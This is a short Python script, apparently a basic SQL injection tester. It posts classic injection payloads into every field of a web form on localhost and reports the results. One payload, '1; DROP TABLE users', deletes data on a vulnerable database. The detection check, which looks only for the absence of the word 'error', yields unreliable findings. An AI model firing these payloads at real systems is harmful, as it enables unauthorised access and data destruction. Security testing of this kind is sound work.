import requests
from bs4 import BeautifulSoup

def test_sql_injection(url, form_id):
    # Test a form for SQL injection vulnerabilities
    payloads = ["' OR '1'='1", "admin' --", "1; DROP TABLE users"]
    results = []
    
    # Fetch the form to find input fields
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    form = soup.find("form", id=form_id)
    if not form:
        return ["No form found with given ID."]
    
    inputs = form.find_all("input")
    fields = [inp["name"] for inp in inputs if inp.get("name")]
    
    # Try each payload to see if it bypasses security
    for payload in payloads:
        data = {field: payload for field in fields}
        try:
            response = requests.post(url, data=data, timeout=5)
            if "error" not in response.text.lower():
                results.append(f"Potential SQL injection found with: {payload}")
        except requests.RequestException:
            results.append(f"Error testing payload: {payload}")
    
    return results if results else ["No SQL injection vulnerabilities detected."]

if __name__ == "__main__":
    test_url = "http://localhost:5000"
    form_id = "login-form"
    print("Starting SQL injection test...")
    results = test_sql_injection(test_url, form_id)
    for result in results:
        print(result)